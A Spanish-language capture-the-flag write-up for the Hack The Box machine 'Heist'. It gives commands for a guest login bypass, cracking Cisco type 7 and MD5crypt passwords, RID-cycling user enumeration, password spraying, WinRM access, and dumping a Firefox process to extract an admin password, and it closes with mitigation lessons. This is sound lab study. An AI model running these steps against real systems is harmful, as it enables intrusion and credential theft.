---
machine: Heist
os: Windows
difficulty: Easy
platform: Hack The Box
category: Web / Windows
state: Retired
tags: [windows, iis, cisco-type7, smb, rid-cycling, winrm, procdump, firefox]
---

# Heist — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

No hay ni un solo exploit de software: todo es higiene de credenciales. El portal de soporte permite entrar como invitado y deja ver un ticket con un **config de Cisco IOS** adjunto; sus contraseñas *type 7* (reversibles por diseño) y su `enable secret 5` (MD5crypt) se crackean y se **reutilizan** contra las cuentas de Windows. Con un usuario se entra por **WinRM**; y como hay un **Firefox** abierto con la sesión del administrador, un volcado de memoria del proceso entrega su contraseña.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
80/tcp   open  http     Microsoft IIS httpd 10.0
135/tcp  open  msrpc    Microsoft Windows RPC
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

El 5985 (WinRM) es la pista de por dónde se entrará. Se añade el vhost:

```bash
echo "<IP> heist.htb" | sudo tee -a /etc/hosts
```

## Acceso

1. **Invitado en el portal** (`http://heist.htb/login.php`): el parámetro `guest=true` salta el login y lleva a `issues.php`. Ahí, el usuario `hazard` adjunta un fichero: `/attachments/config.txt`.

2. **Credenciales del router**:

```text
username rout3r password 7 <type7>
username admin privilege 15 password 7 <type7>
enable secret 5 $1$<hash>
```

- El *type 7* es un XOR reversible: cualquier descifrador de Cisco lo devuelve en claro.
- El *type 5* es MD5crypt:

```bash
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
```

3. **Enumerar usuarios por RPC**: con la contraseña de `hazard` se consulta el dominio local y se hace *RID cycling*.

```bash
rpcclient -U 'hazard%<password>' <IP>
rpcclient -U 'hazard%<password>' <IP> -c 'lookupsid 1000 1200'
```

Aparecen, entre otros, `chase` y `jason`.

4. **Password spray y WinRM**:

```bash
crackmapexec winrm <IP> -u users.txt -p passwords.txt --continue-on-success
evil-winrm -i <IP> -u chase -p '<password>'
```

```text
*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
```

## Escalada

`todo.txt` en el escritorio de Chase dice «Keep checking the issues list», y hay un `firefox.exe` corriendo (no es el navegador por defecto de un servidor). Ese Firefox tiene la sesión del administrador del portal de soporte en memoria.

```powershell
Get-Process firefox
procdump.exe -ma <PID> C:\Windows\Temp\ff.dmp
```

```powershell
Select-String -Path C:\Windows\Temp\ff.dmp -Pattern 'login_password' -Encoding Unicode
```

Del volcado sale la contraseña del portal (`admin@support.htb`), **la misma** que la de la cuenta `Administrator`:

```bash
evil-winrm -i <IP> -u Administrator -p '<password>'
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

## Tropiezos

- **`guest=true`**: el login normal rechaza; el bypass es el parámetro GET, no un formulario.
- **SMB sin shares útiles**: `hazard` autentica pero no llega a nada interesante; el valor está en RPC para listar usuarios.
- **Spray sin lockout**: aquí no hay bloqueo, pero conviene probar una contraseña por usuario antes de barrer el diccionario.
- **Permisos de `procdump`**: si no se puede escribir en `C:\Windows\Temp`, usar el perfil del usuario.

## Lecciones

- Las contraseñas *type 7* de Cisco son ofuscación, no cifrado.
- Reutilizar la contraseña de una aplicación como contraseña de sistema une dos mundos distintos.
- Un navegador abierto con sesión de admin es una credencial en memoria: `procdump` + `strings` la extrae.
- Mitigación: contraseñas únicas por servicio, limpiar adjuntos de tickets, cerrar sesiones de navegador en servidores y deshabilitar WinRM donde no haga falta.
